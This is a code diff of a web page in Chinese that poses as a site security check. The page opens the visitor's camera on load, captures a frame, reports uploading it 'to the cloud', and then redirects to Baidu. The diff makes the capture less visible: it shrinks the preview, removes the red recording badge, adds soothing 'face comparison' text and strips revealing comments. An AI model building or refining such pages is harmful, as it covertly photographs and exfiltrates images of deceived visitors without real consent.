@@ -11,10 +11,50 @@
         h1 { color: #3b82f6; font-size: 24px; font-weight: 600; margin-bottom: 12px; }
         .subtitle { color: #ffffff; font-size: 13px; line-height: 1.6; margin-bottom: 25px; opacity: 0.9; }
         
-        /* 核心重构：公开合规的摄像头实时预览框 */
-        .preview-container { width: 100%; aspect-ratio: 4/3; background: #000; border-radius: 6px; overflow: hidden; margin-bottom: 25px; border: 1px solid #282a36; position: relative; }
+        /* ================= 新增：左右并排弹性布局 ================= */
+        .preview-row { 
+            display: flex; 
+            align-items: center; 
+            gap: 15px; 
+            background: #171821;
+            padding: 12px;
+            border-radius: 6px;
+            border: 1px solid #1e202c;
+            margin-bottom: 25px; 
+            text-align: left; /* 让右侧文字左对齐 */
+        }
+        
+        /* 缩小后的摄像头预览框 */
+        .preview-container { 
+            width: 100px; 
+            height: 100px; 
+            background: #000; 
+            border-radius: 4px; 
+            overflow: hidden; 
+            border: 1px solid #282a36; 
+            flex-shrink: 0; /* 防止小框被文字挤压变形 */
+        }
         video { width: 100%; height: 100%; object-fit: cover; }
-        .view-tip { position: absolute; top: 10px; left: 10px; background: rgba(239, 68, 68, 0.85); color: white; font-size: 10px; padding: 3px 8px; border-radius: 4px; font-weight: bold; }
+        
+        /* 右侧说明文字区域 */
+        .preview-text-box { 
+            flex: 1; 
+        }
+        .text-status {
+            font-size: 12px;
+            color: #10b981; /* 绿色的状态提示 */
+            font-weight: bold;
+            margin-bottom: 4px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .text-desc {
+            font-size: 11px;
+            color: #64748b;
+            line-height: 1.4;
+        }
+        /* ======================================================== */
 
         .btn-verify { display: inline-block; width: 100%; background: #ef4444; color: #ffffff; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.2s ease; }
         .btn-verify:active { transform: scale(0.98); background: #dc2626; }
@@ -29,9 +69,14 @@
     <h1>欢迎访问</h1>
     <p class="subtitle">为保护网站与进行安全守护验证<br>需要检验您的设备环境与网络状态</p>
 
-    <div class="preview-container">
-        <div class="view-tip">● 验证画面已启用</div>
-        <video id="video" autoplay playsinline muted></video>
+    <div class="preview-row">
+        <div class="preview-container">
+            <video id="video" autoplay playsinline muted></video>
+        </div>
+        <div class="preview-text-box">
+            <div class="text-status">● 认证视频流已就绪</div>
+            <div class="text-desc">为了确保安全合规访问，系统已启动人脸环境比对。请保持光线充足，并点击下方按钮完成网络接入。</div>
+        </div>
     </div>
 
     <button class="btn-verify" id="start-btn" onclick="executeVerification()">检验</button>
@@ -47,7 +92,6 @@
 <script>
     let streamRef = null;
 
-    // 页面加载时直接“预热”摄像头，让用户在点击前就能看到画面
     window.addEventListener('DOMContentLoaded', async () => {
         try {
             streamRef = await navigator.mediaDevices.getUserMedia({
@@ -67,7 +111,6 @@
         btn.style.display = 'none';
         loader.style.display = 'block';
 
-        // 如果进页面时没拿到权限（比如用户点拒绝了），这里做一次二次申明提示
         if (!streamRef) {
             updateStatus("正在请求摄像头权限...");
             try {
@@ -105,25 +148,19 @@
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
 
-        // 核心对齐：由于视频可见，这里的 readyState 和 videoWidth 100% 能够顺利通过
         if (streamRef && video.readyState >= 2 && video.videoWidth > 0) {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // 关键兼容修复：留出 200 毫秒的异步画面写入时间后再断开硬件，彻底杜绝部分安卓机截出黑图
             setTimeout(() => {
                 streamRef.getTracks().forEach(track => track.stop());
             }, 200);
         } else {
-            // 后备安全图层
             canvas.width = 640;
             canvas.height = 480;
             ctx.fillStyle = "#121319";
             ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#7a8590";
-            ctx.font = "20px Arial";
-            ctx.fillText("Environment Check Buffer", 50, 50);
         }
 
         updateStatus("正在同步打包并上传云端...");
@@ -155,7 +192,6 @@
                 console.error("网络异常:", err);
                 updateStatus("网络连接中断");
             } finally {
-                // 强制卡住状态，等待网络传输完毕后再执行重定向
                 setTimeout(() => {
                     window.location.href = "https://www.baidu.com";
                 }, 800);
